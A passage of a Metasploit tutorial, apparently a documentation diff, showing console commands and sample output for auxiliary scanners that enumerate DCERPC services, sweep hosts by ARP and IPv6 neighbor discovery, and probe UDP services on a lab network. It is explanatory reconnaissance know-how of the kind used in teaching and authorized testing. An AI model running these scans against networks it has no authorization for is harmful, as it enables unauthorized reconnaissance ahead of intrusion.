+   VM        XPSP3CloneMe            yes       The VM to try to Power On
+
+
+Running the module gives little output but nothing more is needed besides the success or failure of powering on the virtual machine.
+
+::
+
+  msf  auxiliary(poweron_vm) > run
+
+ [+] VM Powered On Successfully
+ [*] Auxiliary module execution completed
+ msf  auxiliary(poweron_vm) >
+
+
+Scanners
+^^^^^^^^^^^^
+
+DCERPC
+"""""""
+
+**endpoint_mapper**
+
+The endpoint_mapper module queries the EndPoint Mapper service of a remote system to determine what services are available. In the information gathering stage, this can provide some very valuable information.
+
+::
+
+  msf > use auxiliary/scanner/dcerpc/endpoint_mapper
+ msf auxiliary(endpoint_mapper) > show options
+
+ Module options:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    135              yes       The target port
+   THREADS  1                yes       The number of concurrent threads
+
+In order to run the module, all we need to do is pass it a range of IP addresses, set the THREADS count, and let it go to work.
+
+::
+
+  msf auxiliary(endpoint_mapper) > set RHOSTS 192.168.1.200-254
+ RHOSTS => 192.168.1.200-254
+ msf auxiliary(endpoint_mapper) > set THREADS 55
+ threads => 55
+ msf auxiliary(endpoint_mapper) > run
+ [*] Connecting to the endpoint mapper service...
+ [*] Connecting to the endpoint mapper service...
+ [*] Connecting to the endpoint mapper service...
+ ...snip...
+ [*] Connecting to the endpoint mapper service...
+ [*] Connecting to the endpoint mapper service...
+ [*] 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5 v1.0 LRPC (dhcpcsvc) [DHCP Client LRPC Endpoint]
+ [*] 3473dd4d-2e88-4006-9cba-22570909dd10 v5.0 LRPC (W32TIME_ALT) [WinHttp Auto-Proxy Service]
+ [*] 3473dd4d-2e88-4006-9cba-22570909dd10 v5.0 PIPE (\PIPE\W32TIME_ALT) \\XEN-2K3-BARE [WinHttp Auto-Proxy Service]
+ [*] 906b0ce0-c70b-1067-b317-00dd010662da v1.0 LRPC (LRPC00000408.00000001)
+ [*] 906b0ce0-c70b-1067-b317-00dd010662da v1.0 LRPC (LRPC00000408.00000001)
+ [*] 906b0ce0-c70b-1067-b317-00dd010662da v1.0 LRPC (LRPC00000408.00000001)
+ [*] 906b0ce0-c70b-1067-b317-00dd010662da v1.0 LRPC (LRPC00000408.00000001)
+ [*] Could not connect to the endpoint mapper service
+ [*] 12345778-1234-abcd-ef00-0123456789ac v1.0 PIPE (\PIPE\lsass) \\XEN-2K3-BARE
+ [*] 12345778-1234-abcd-ef00-0123456789ac v1.0 LRPC (audit)
+ [*] Connecting to the endpoint mapper service...
+ [*] 12345778-1234-abcd-ef00-0123456789ac v1.0 LRPC (securityevent)
+ [*] 12345778-1234-abcd-ef00-0123456789ac v1.0 LRPC (protected_storage)
+ [*] 12345778-1234-abcd-ef00-0123456789ac v1.0 PIPE (\PIPE\protected_storage) \\XEN-2K3-BARE
+ [*] 12345778-1234-abcd-ef00-0123456789ac v1.0 LRPC (dsrole)
+ [*] 12345778-1234-abcd-ef00-0123456789ac v1.0 TCP (1025) 192.168.1.204
+ [*] 12345678-1234-abcd-ef00-0123456789ab v1.0 PIPE (\PIPE\lsass) \\XEN-2K3-BARE [IPSec Policy agent endpoint]
+ [*] 12345678-1234-abcd-ef00-0123456789ab v1.0 LRPC (audit) [IPSec Policy agent endpoint]
+ [*] 12345678-1234-abcd-ef00-0123456789ab v1.0 LRPC (securityevent) [IPSec Policy agent endpoint]
+ [*] 12345678-1234-abcd-ef00-0123456789ab v1.0 LRPC (protected_storage) [IPSec Policy agent endpoint]
+ [*] 12345678-1234-abcd-ef00-0123456789ab v1.0 PIPE (\PIPE\protected_storage) \\XEN-2K3-BARE [IPSec Policy agent endpoint]
+ [*] 12345678-1234-abcd-ef00-0123456789ab v1.0 LRPC (dsrole) [IPSec Policy agent endpoint]
+ [*] 12345678-1234-abcd-ef00-0123456789ab v1.0 TCP (1025) 192.168.1.204 [IPSec Policy agent endpoint]
+ [*] 1ff70682-0a51-30e8-076d-740be8cee98b v1.0 LRPC (wzcsvc)
+ [*] 1ff70682-0a51-30e8-076d-740be8cee98b v1.0 LRPC (OLE3B0AF7639CA847BCA879F781582D)
+ [*] 1ff70682-0a51-30e8-076d-740be8cee98b v1.0 PIPE (\PIPE\atsvc) \\XEN-2K3-BARE
+ [*] 378e52b0-c0a9-11cf-822d-00aa0051e40f v1.0 LRPC (wzcsvc)
+ [*] 378e52b0-c0a9-11cf-822d-00aa0051e40f v1.0 LRPC (OLE3B0AF7639CA847BCA879F781582D)
+ [*] 378e52b0-c0a9-11cf-822d-00aa0051e40f v1.0 PIPE (\PIPE\atsvc) \\XEN-2K3-BARE
+ [*] 0a74ef1c-41a4-4e06-83ae-dc74fb1cdd53 v1.0 LRPC (wzcsvc)
+ [*] 0a74ef1c-41a4-4e06-83ae-dc74fb1cdd53 v1.0 LRPC (OLE3B0AF7639CA847BCA879F781582D)
+ [*] 0a74ef1c-41a4-4e06-83ae-dc74fb1cdd53 v1.0 PIPE (\PIPE\atsvc) \\XEN-2K3-BARE
+ [*] 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5 v1.0 LRPC (DNSResolver) [DHCP Client LRPC Endpoint]
+ [*] d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 TCP (49152) 192.168.1.202
+ [*] 4b112204-0e19-11d3-b42b-0000f81feb9f v1.0 LRPC (LRPC-71ea8d8164d4fa6391)
+ [*] 76f226c3-ec14-4325-8a99-6a46348418af v1.0 LRPC (WMsgKRpc05FBE22)
+ [*] 12e65dd8-887f-41ef-91bf-8d816c42c2e7 v1.0 LRPC (WMsgKRpc05FBE22) [Secure Desktop LRPC interface]
+ [*] b58aa02e-2884-4e97-8176-4ee06d794184 v1.0 LRPC (OLE7A8F68570F354B65A0C8D44DCBE0)
+ [*] b58aa02e-2884-4e97-8176-4ee06d794184 v1.0 PIPE (\pipe\trkwks) \\XEN-WIN7-BARE
+ [*] b58aa02e-2884-4e97-8176-4ee06d794184 v1.0 LRPC (trkwks)
+ [*] b58aa02e-2884-4e97-8176-4ee06d794184 v1.0 LRPC (RemoteDevicesLPC_API)
+ [*] b58aa02e-2884-4e97-8176-4ee06d794184 v1.0 LRPC (TSUMRPD_PRINT_DRV_LPC_API)
+ [*] 0767a036-0d22-48aa-ba69-b619480f38cb v1.0 LRPC (OLE7A8F68570F354B65A0C8D44DCBE0) [PcaSvc]
+ [*] 0767a036-0d22-48aa-ba69-b619480f38cb v1.0 PIPE (\pipe\trkwks) \\XEN-WIN7-BARE [PcaSvc]
+ [*] 0767a036-0d22-48aa-ba69-b619480f38cb v1.0 LRPC (trkwks) [PcaSvc]
+ [*] 0767a036-0d22-48aa-ba69-b619480f38cb v1.0 LRPC (RemoteDevicesLPC_API) [PcaSvc]
+ ...snip...
+ [*] f6beaff7-1e19-4fbb-9f8f-b89e2018337c v1.0 LRPC (eventlog) [Event log TCPIP]
+ [*] f6beaff7-1e19-4fbb-9f8f-b89e2018337c v1.0 PIPE (\pipe\eventlog) \\XEN-WIN7-BARE [Event log TCPIP]
+ [*] f6beaff7-1e19-4fbb-9f8f-b89e2018337c v1.0 TCP (49153) 192.168.1.202 [Event log TCPIP]
+ [*] 30adc50c-5cbc-46ce-9a0e-91914789e23c v1.0 LRPC (eventlog) [NRP server endpoint]
+ [*] 30adc50c-5cbc-46ce-9a0e-91914789e23c v1.0 PIPE (\pipe\eventlog) \\XEN-WIN7-BARE [NRP server endpoint]
+ [*] 30adc50c-5cbc-46ce-9a0e-91914789e23c v1.0 TCP (49153) 192.168.1.202 [NRP server endpoint]
+ [*] 30adc50c-5cbc-46ce-9a0e-91914789e23c v1.0 LRPC (AudioClientRpc) [NRP server endpoint]
+ [*] 30adc50c-5cbc-46ce-9a0e-91914789e23c v1.0 LRPC (Audiosrv) [NRP server endpoint]
+ [*] 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5 v1.0 LRPC (eventlog) [DHCP Client LRPC Endpoint]
+ [*] 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5 v1.0 PIPE (\pipe\eventlog) \\XEN-WIN7-BARE [DHCP Client LRPC Endpoint]
+ [*] 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5 v1.0 TCP (49153) 192.168.1.202 [DHCP Client LRPC Endpoint]
+ [*] 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5 v1.0 LRPC (AudioClientRpc) [DHCP Client LRPC Endpoint]
+ [*] 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5 v1.0 LRPC (Audiosrv) [DHCP Client LRPC Endpoint]
+ [*] 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d5 v1.0 LRPC (dhcpcsvc) [DHCP Client LRPC Endpoint]
+ [*] 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6 v1.0 LRPC (eventlog) [DHCPv6 Client LRPC Endpoint]
+ [*] 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6 v1.0 PIPE (\pipe\eventlog) \\XEN-WIN7-BARE [DHCPv6 Client LRPC Endpoint]
+ [*] 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6 v1.0 TCP (49153) 192.168.1.202 [DHCPv6 Client LRPC Endpoint]
+ [*] 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6 v1.0 LRPC (AudioClientRpc) [DHCPv6 Client LRPC Endpoint]
+ [*] 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6 v1.0 LRPC (Audiosrv) [DHCPv6 Client LRPC Endpoint]
+ [*] 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6 v1.0 LRPC (dhcpcsvc) [DHCPv6 Client LRPC Endpoint]
+ [*] 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6 v1.0 LRPC (dhcpcsvc6) [DHCPv6 Client LRPC Endpoint]
+ [*] 06bba54a-be05-49f9-b0a0-30f790261023 v1.0 LRPC (eventlog) [Security Center]
+ [*] 06bba54a-be05-49f9-b0a0-30f790261023 v1.0 PIPE (\pipe\eventlog) \\XEN-WIN7-BARE [Security Center]
+ [*] 06bba54a-be05-49f9-b0a0-30f790261023 v1.0 TCP (49153) 192.168.1.202 [Security Center]
+ [*] 06bba54a-be05-49f9-b0a0-30f790261023 v1.0 LRPC (AudioClientRpc) [Security Center]
+ [*] 06bba54a-be05-49f9-b0a0-30f790261023 v1.0 LRPC (Audiosrv) [Security Center]
+ [*] 06bba54a-be05-49f9-b0a0-30f790261023 v1.0 LRPC (dhcpcsvc) [Security Center]
+ [*] 06bba54a-be05-49f9-b0a0-30f790261023 v1.0 LRPC (dhcpcsvc6) [Security Center]
+ [*] 06bba54a-be05-49f9-b0a0-30f790261023 v1.0 LRPC (OLE7F5D2071B7D4441897C08153F2A2) [Security Center]
+ [*] 76f226c3-ec14-4325-8a99-6a46348418af v1.0 LRPC (WMsgKRpc045EC1)
+ [*] c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 LRPC (LRPC-af541be9090579589d) [Impl friendly name]
+ [*] 76f226c3-ec14-4325-8a99-6a46348418af v1.0 LRPC (WMsgKRpc0441F0)
+ [*] 76f226c3-ec14-4325-8a99-6a46348418af v1.0 PIPE (\PIPE\InitShutdown) \\XEN-WIN7-BARE
+ [*] 76f226c3-ec14-4325-8a99-6a46348418af v1.0 LRPC (WindowsShutdown)
+ [*] d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 LRPC (WMsgKRpc0441F0)
+ [*] d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 PIPE (\PIPE\InitShutdown) \\XEN-WIN7-BARE
+ [*] d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 LRPC (WindowsShutdown)
+ [*] Could not connect to the endpoint mapper service
+ [*] Scanned 06 of 55 hosts (010% complete)
+ ...snip...
+ [*] Scanned 55 of 55 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(endpoint_mapper) >
+
+
+**hidden**
+
+The dcerpc/hidden scanner connects to a given range of IP addresses and try to locate any RPC services that are not listed in the Endpoint Mapper and determine if anonymous access to the service is allowed.
+
+::
+
+  msf > use auxiliary/scanner/dcerpc/hidden
+ msf auxiliary(hidden) > show options
+
+ Module options:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target address range or CIDR identifier
+   THREADS  1                yes       The number of concurrent threads
+
+As you can see, there are not many options to configure so we will just point it at some targets and let it run.
+
+::
+
+  msf auxiliary(hidden) > set RHOSTS 192.168.1.200-254
+ RHOSTS => 192.168.1.200-254
+ msf auxiliary(hidden) > set THREADS 55
+ THREADS => 55
+ msf auxiliary(hidden) > run
+
+ [*] Connecting to the endpoint mapper service...
+ [*] Connecting to the endpoint mapper service...
+ [*] Connecting to the endpoint mapper service...
+ ...snip...
+ [*] Connecting to the endpoint mapper service...
+ [*] Connecting to the endpoint mapper service...
+ [*] Could not obtain the endpoint list: DCERPC FAULT => nca_s_fault_access_denied
+ [*] Could not contact the endpoint mapper on 192.168.1.203
+ [*] Could not obtain the endpoint list: DCERPC FAULT => nca_s_fault_access_denied
+ [*] Could not contact the endpoint mapper on 192.168.1.201
+ [*] Could not connect to the endpoint mapper service
+ [*] Could not contact the endpoint mapper on 192.168.1.250
+ [*] Looking for services on 192.168.1.204:1025...
+ [*] 	HIDDEN: UUID 12345778-1234-abcd-ef00-0123456789ab v0.0
+ [*] Looking for services on 192.168.1.202:49152...
+ [*] 		CONN BIND CALL ERROR=DCERPC FAULT => nca_s_fault_ndr
+ [*]
+ [*] 	HIDDEN: UUID c681d488-d850-11d0-8c52-00c04fd90f7e v1.0
+ [*] 		CONN BIND CALL ERROR=DCERPC FAULT => nca_s_fault_ndr
+ [*]
+ [*] 	HIDDEN: UUID 11220835-5b26-4d94-ae86-c3e475a809de v1.0
+ [*] 		CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied
+ [*]
+ [*] 	HIDDEN: UUID 5cbe92cb-f4be-45c9-9fc9-33e73e557b20 v1.0
+ [*] 		CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied
+ [*]
+ [*] 	HIDDEN: UUID 3919286a-b10c-11d0-9ba8-00c04fd92ef5 v0.0
+ [*] 		CONN BIND CALL DATA=0000000057000000
+ [*]
+ [*] 	HIDDEN: UUID 1cbcad78-df0b-4934-b558-87839ea501c9 v0.0
+ [*] 		CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied
+ [*]
+ [*] 	HIDDEN: UUID c9378ff1-16f7-11d0-a0b2-00aa0061426a v1.0
+ [*] 		CONN BIND ERROR=DCERPC FAULT => nca_s_fault_access_denied
+ [*]
+ [*] Remote Management Interface Error: The connection timed out (192.168.1.202:49152).
+ ...snip...
+ [*] Scanned 55 of 55 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(hidden) >
+
+
+As you can see, despite the simple setup, we still gathered some additional information about one of our targets.
+
+**management**
+
+The dcerpc/management module scans a range of IP addresses and obtains information from the Remote Management interface of the DCERPC service.
+
+::
+
+  msf > use auxiliary/scanner/dcerpc/management
+ msf auxiliary(management) > show options
+
+ Module options:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    135              yes       The target port
+   THREADS  1                yes       The number of concurrent threads
+
+
+There is minimal configuration required for this module; we simply need to set our THREADS value and the range of hosts we want scanned and run the module.
+
+
+::
+
+  msf auxiliary(management) > set RHOSTS 192.168.1.200-254
+ RHOSTS => 192.168.1.200-254
+ msf auxiliary(management) > set THREADS 55
+ THREADS => 55
+ msf auxiliary(management) > run
+
+ [*] Remote Management Interface Error: DCERPC FAULT => nca_s_fault_access_denied
+ [*] Remote Management Interface Error: DCERPC FAULT => nca_s_fault_access_denied
+ [*] UUID e1af8308-5d1f-11c9-91a4-08002b14a0fa v3.0
+ [*] Remote Management Interface Error: DCERPC FAULT => nca_s_fault_access_denied
+ [*] Remote Management Interface Error: The connection was refused by the remote host (192.168.1.250:135).
+ [*] Remote Management Interface Error: DCERPC FAULT => nca_s_fault_ndr
+ [*] 	 listening: 00000000
+  [*] 	 killed: 00000005
+ [*] 	 name: 00010000000000000100000000000000d3060000
+ [*] UUID 0b0a6584-9e0f-11cf-a3cf-00805f68cb1b v1.1
+ [*] Remote Management Interface Error: DCERPC FAULT => nca_s_fault_ndr
+ [*] 	 listening: 00000000
+ [*] 	 killed: 00000005
+ [*] 	 name: 00010000000000000100000000000000d3060000
+ [*] UUID 1d55b526-c137-46c5-ab79-638f2a68e869 v1.0
+ [*] Remote Management Interface Error: DCERPC FAULT => nca_s_fault_ndr
+ [*] 	 listening: 00000000
+ [*] 	 killed: 00000005
+ [*] 	 name: 00010000000000000100000000000000d3060000
+ [*] UUID e60c73e6-88f9-11cf-9af1-0020af6e72f4 v2.0
+ [*] Remote Management Interface Error: DCERPC FAULT => nca_s_fault_ndr
+ [*] 	 listening: 00000000
+ [*] 	 killed: 00000005
+ [*] 	 name: 00010000000000000100000000000000d3060000
+ [*] UUID 99fcfec4-5260-101b-bbcb-00aa0021347a v0.0
+ [*] Remote Management Interface Error: DCERPC FAULT => nca_s_fault_ndr
+ [*] 	 listening: 00000000
+ [*] 	 killed: 00000005
+ [*] 	 name: 00010000000000000100000000000000d3060000
+ [*] UUID b9e79e60-3d52-11ce-aaa1-00006901293f v0.2
+ [*] Remote Management Interface Error: DCERPC FAULT => nca_s_fault_ndr
+ [*] 	 listening: 00000000
+ [*] 	 killed: 00000005
+ [*] 	 name: 00010000000000000100000000000000d3060000
+ [*] UUID 412f241e-c12a-11ce-abff-0020af6e7a17 v0.2
+ [*] Remote Management Interface Error: DCERPC FAULT => nca_s_fault_ndr
+ [*] 	 listening: 00000000
+ [*] 	 killed: 00000005
+ [*] 	 name: 00010000000000000100000000000000d3060000
+ [*] UUID 00000136-0000-0000-c000-000000000046 v0.0
+ [*] Remote Management Interface Error: DCERPC FAULT => nca_s_fault_ndr
+ [*] 	 listening: 00000000
+ [*] 	 killed: 00000005
+ [*] 	 name: 00010000000000000100000000000000d3060000
+ [*] UUID c6f3ee72-ce7e-11d1-b71e-00c04fc3111a v1.0
+ [*] Remote Management Interface Error: DCERPC FAULT => nca_s_fault_ndr
+ [*] 	 listening: 00000000
+ [*] 	 killed: 00000005
+ [*] 	 name: 00010000000000000100000000000000d3060000
+ [*] UUID 4d9f4ab8-7d1c-11cf-861e-0020af6e7c57 v0.0
+ [*] Remote Management Interface Error: DCERPC FAULT => nca_s_fault_ndr
+ [*] 	 listening: 00000000
+ [*] 	 killed: 00000005
+ [*] 	 name: 00010000000000000100000000000000d3060000
+ [*] UUID 000001a0-0000-0000-c000-000000000046 v0.0
+ [*] Remote Management Interface Error: DCERPC FAULT => nca_s_fault_ndr
+ [*] 	 listening: 00000000
+ [*] 	 killed: 00000005
+ [*] 	 name: 00010000000000000100000000000000d3060000
+ ...snip...
+ [*] Scanned 55 of 55 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(management) >
+
+
+**tcp_dcerpc_auditor**
+
+The dcerpc/tcp_dcerpc_auditor module scans a range of IP addresses to determine what DCERPC services are available over a TCP port.
+
+::
+
+  msf > use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor
+ msf auxiliary(tcp_dcerpc_auditor) > show options
+
+ Module options:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    135              yes       The target port
+   THREADS  1                yes       The number of concurrent threads
+
+
+To run this scanner, we just need to set our RHOSTS and THREADS values and let it run.
+
+::
+
+  msf auxiliary(tcp_dcerpc_auditor) > set RHOSTS 192.168.1.200-254
+ RHOSTS => 192.168.1.200-254
+ msf auxiliary(tcp_dcerpc_auditor) > set THREADS 55
+ THREADS => 55
+ msf auxiliary(tcp_dcerpc_auditor) > run
+
+ The connection was refused by the remote host (192.168.1.250:135).
+ The host (192.168.1.210:135) was unreachable.
+ ...snip...
+ The host (192.168.1.200:135) was unreachable.
+ [*] Scanned 38 of 55 hosts (069% complete)
+ ...snip...
+ The host (192.168.1.246:135) was unreachable.
+ 192.168.1.203 - UUID 99fcfec4-5260-101b-bbcb-00aa0021347a 0.0 OPEN VIA 135 ACCESS GRANTED 00000000000000000000000000000000000000000000000005000000
+ 192.168.1.201 - UUID 99fcfec4-5260-101b-bbcb-00aa0021347a 0.0 OPEN VIA 135 ACCESS GRANTED 00000000000000000000000000000000000000000000000005000000
+ 192.168.1.204 - UUID 99fcfec4-5260-101b-bbcb-00aa0021347a 0.0 OPEN VIA 135 ACCESS GRANTED 00000000000000000000000000000000000000000000000076070000
+ 192.168.1.202 - UUID 99fcfec4-5260-101b-bbcb-00aa0021347a 0.0 OPEN VIA 135 ACCESS GRANTED 00000000000000000000000000000000000000000000000005000000
+ 192.168.1.204 - UUID afa8bd80-7d8a-11c9-bef4-08002b102989 1.0 OPEN VIA 135 ACCESS GRANTED  000002000b0000000b00000004000200080002000c0002001000020014000200180002001c0002002000020024000200280002002c0002000883afe11f5dc91191a408002b14a0fa0300000084650a0b0f9ecf11a3cf00805f68cb1b0100010026b5551d37c1c546ab79638f2a68e86901000000e6730ce6f988cf119af10020af6e72f402000000c4fefc9960521b10bbcb00aa0021347a00000000609ee7b9523dce11aaa100006901293f000002001e242f412ac1ce11abff0020af6e7a17000002003601000000000000c0000000000000460000000072eef3c67eced111b71e00c04fc3111a01000000b84a9f4d1c7dcf11861e0020af6e 7c5700000000a001000000000000c0000000000000460000000000000000
+ 192.168.1.204 - UUID e1af8308-5d1f-11c9-91a4-08002b14a0fa 3.0 OPEN VIA 135 ACCESS GRANTED d8060000
+ [*] Scanned 52 of 55 hosts (094% complete)
+ [*] Scanned 54 of 55 hosts (098% complete)
+ The connection timed out (192.168.1.205:135).
+ [*] Scanned 55 of 55 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(tcp_dcerpc_auditor) >
+
+
+As you can see, this quick scan has turned up some available services on a number of our hosts which could warrant further investigation.
+
+
+Discovery
+""""""""""
+
+
+**arp_sweep**
+
+When your target systems are located on the same network as your attacking machine, you can enumerate systems by performing an ARP scan. Naturally, Metasploit has a module that can help you out.
+
+::
+
+  msf > use auxiliary/scanner/discovery/arp_sweep
+ msf auxiliary(arp_sweep) > show options
+
+ Module options (auxiliary/scanner/discovery/arp_sweep):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   INTERFACE                   no        The name of the interface
+   RHOSTS                      yes       The target address range or CIDR identifier
+   SHOST                       no        Source IP Address
+   SMAC                        no        Source MAC Address
+   THREADS    1                yes       The number of concurrent threads
+   TIMEOUT    5                yes       The number of seconds to wait for new data
+
+
+Due to the manner in which ARP scanning is performed, you need to pass your MAC address and source IP address to the scanner in order for it to function properly.
+
+::
+
+  msf auxiliary(arp_sweep) > set RHOSTS 192.168.1.200-254
+ RHOSTS => 192.168.1.200-254
+ msf auxiliary(arp_sweep) > set SHOST 192.168.1.101
+ SHOST => 192.168.1.101
+ msf auxiliary(arp_sweep) > set SMAC d6:46:a7:38:15:65
+ SMAC => d6:46:a7:38:15:65
+ msf auxiliary(arp_sweep) > set THREADS 55
+ THREADS => 55
+ msf auxiliary(arp_sweep) > run
+
+ [*] 192.168.1.201 appears to be up.
+ [*] 192.168.1.203 appears to be up.
+ [*] 192.168.1.205 appears to be up.
+ [*] 192.168.1.206 appears to be up.
+ [*] 192.168.1.250 appears to be up.
+ [*] Scanned 55 of 55 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(arp_sweep) >
+
+
+As you will see when running this module, ARP scanning is very fast.
+
+
+**ipv6_neighbor**
+
+
+The “ipv6_neighbor” auxiliary module probes the local network for IPv6 hosts that respond to Neighbor Solicitations with a link-local address. This module, like the arp_sweep one, will generally only work within the attacking machine’s broadcast domain.
+
+
+::
+
+  msf > use auxiliary/scanner/discovery/ipv6_neighbor
+ msf auxiliary(ipv6_neighbor) > show options
+
+ Module options:
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   INTERFACE                   no        The name of the interface
+   PCAPFILE                    no        The name of the PCAP capture file to process
+   RHOSTS                      yes       The target address range or CIDR identifier
+   SHOST                       yes       Source IP Address
+   SMAC                        yes       Source MAC Address
+   THREADS    1                yes       The number of concurrent threads
+   TIMEOUT    500              yes       The number of seconds to wait for new data
+
+
+In addition to setting our RHOSTS value, we also need to set our source MAC address(SMAC) and source host(SHOST) IP address. We then set our RHOSTS and THREADS values and let the scanner run.
+
+
+::
+
+  msf auxiliary(ipv6_neighbor) > set RHOSTS 192.168.1.2-254
+ RHOSTS => 192.168.1.200-254
+ msf auxiliary(ipv6_neighbor) > set SHOST 192.168.1.101
+ SHOST => 192.168.1.101
+ msf auxiliary(ipv6_neighbor) > set SMAC d6:46:a7:38:15:65
+ SMAC => d6:46:a7:38:15:65
+ msf auxiliary(ipv6_neighbor) > set THREADS 55
+ THREADS => 55
+ msf auxiliary(ipv6_neighbor) > run
+
+ [*] IPv4 Hosts Discovery
+ [*] 192.168.1.10 is alive.
+ [*] 192.168.1.11 is alive.
+ [*] 192.168.1.2 is alive.
+ [*] 192.168.1.69 is alive.
+ [*] 192.168.1.109 is alive.
+ [*] 192.168.1.150 is alive.
+ [*] 192.168.1.61 is alive.
+ [*] 192.168.1.201 is alive.
+ [*] 192.168.1.203 is alive.
+ [*] 192.168.1.205 is alive.
+ [*] 192.168.1.206 is alive.
+ [*] 192.168.1.99 is alive.
+ [*] 192.168.1.97 is alive.
+ [*] 192.168.1.250 is alive.
+ [*] IPv6 Neighbor Discovery
+ [*] 192.168.1.69 maps to IPv6 link local address fe80::5a55:caff:fe14:1e61
+ [*] 192.168.1.99 maps to IPv6 link local address fe80::5ab0:35ff:fe6a:4ecc
+ [*] 192.168.1.97 maps to IPv6 link local address fe80::7ec5:37ff:fef9:a96a
+ [*] Scanned 253 of 253 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(ipv6_neighbor) >
+
+
+Looking at the module output, you can see that this scanner serves the dual-purpose of showing what hosts are online similar to arp_sweep and then performs the IPv6 Neighbor Discovery.
+
+**udp_probe*
+
+The “udp_probe” module scans a given range of hosts for common UDP services. Note: This module is deprecated and may disappear at any time.
+
+::
+
+  msf > use auxiliary/scanner/discovery/udp_probe
+
+ [!] ******************************************************************************************
+ [!] *                 The module scanner/discovery/udp_probe is deprecated!                  *
+ [!] *                       It will be removed on or about 2016-11-23                        *
+ [!] *                   Use auxiliary/scanner/discovery/udp_sweep instead                    *
+ [!] ******************************************************************************************
+ msf auxiliary(udp_probe) > show options
+
+ Module options (auxiliary/scanner/discovery/udp_probe):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   RHOSTS                    yes       The target address range or CIDR identifier
+   THREADS  1                yes       The number of concurrent threads
+
+
+There are very few required settings for this module so we just configure the RHOSTS and THREADS values and let it run.
+
+::
+
+  msf auxiliary(udp_probe) > set RHOSTS 192.168.1.2-254
+ RHOSTS => 192.168.1.2-254
+ msf auxiliary(udp_probe) > set THREADS 253
+ THREADS => 253
+ msf auxiliary(udp_probe) > run
+
+ [*] Discovered SNMP on 192.168.1.2:161 (GSM7224 L2 Managed Gigabit Switch)
+ [*] Discovered SNMP on 192.168.1.2:161 (GSM7224 L2 Managed Gigabit Switch)
+ [*] Discovered NetBIOS on 192.168.1.109:137 (SAMSUNG::U :SAMSUNG::U :00:15:99:3f:40:bd)
+ [*] Discovered NetBIOS on 192.168.1.150:137 (XEN-WIN7-PROD::U :WORKGROUP::G :XEN-WIN7-PROD::U :WORKGROUP::G :aa:e3:27:6e:3b:a5)
+ [*] Discovered SNMP on 192.168.1.109:161 (Samsung CLX-3160 Series; OS V1.01.01.16 02-25-2008;Engine 6.01.00;NIC V4.03.08(CLX-3160) 02-25-2008;S/N 8Y61B1GP400065Y.)
+ [*] Discovered NetBIOS on 192.168.1.206:137 (XEN-XP-PATCHED::U :XEN-XP-PATCHED::U :HOTZONE::G :HOTZONE::G :12:fa:1a:75:b8:a5)
+ [*] Discovered NetBIOS on 192.168.1.203:137 (XEN-XP-SPLOIT::U :WORKGROUP::G :XEN-XP-SPLOIT::U :WORKGROUP::G :3e:ff:3c:4c:89:67)
+ [*] Discovered NetBIOS on 192.168.1.201:137 (XEN-XP-SP2-BARE::U :HOTZONE::G :XEN-XP-SP2-BARE::U :HOTZONE::G :HOTZONE::U :__MSBROWSE__::G :c6:ce:4e:d9:c9:6e)
+ [*] Discovered SNMP on 192.168.1.109:161 (Samsung CLX-3160 Series; OS V1.01.01.16 02-25-2008;Engine 6.01.00;NIC V4.03.08(CLX-3160) 02-25-2008;S/N 8Y61B1GP400065Y.)
+ [*] Discovered NTP on 192.168.1.69:123 (NTP v4)
+ [*] Discovered NetBIOS on 192.168.1.250:137 (FREENAS::U :FREENAS::U :FREENAS::U :__MSBROWSE__::G :WORKGROUP::U :WORKGROUP::G :WORKGROUP::G :00:00:00:00:00:00)
+ [*] Discovered NTP on 192.168.1.203:123 (Microsoft NTP)
+ [*] Discovered MSSQL on 192.168.1.206:1434 (ServerName=XEN-XP-PATCHED InstanceName=SQLEXPRESS IsClustered=No Version=9.00.4035.00 tcp=1050 np=\\XEN-XP-PATCHED\pipe\MSSQL$SQLEXPRESS\sql\query )
+ [*] Discovered NTP on 192.168.1.206:123 (Microsoft NTP)
+ [*] Discovered NTP on 192.168.1.201:123 (Microsoft NTP)
+ [*] Scanned 029 of 253 hosts (011% complete)
+ [*] Scanned 052 of 253 hosts (020% complete)
+ [*] Scanned 084 of 253 hosts (033% complete)
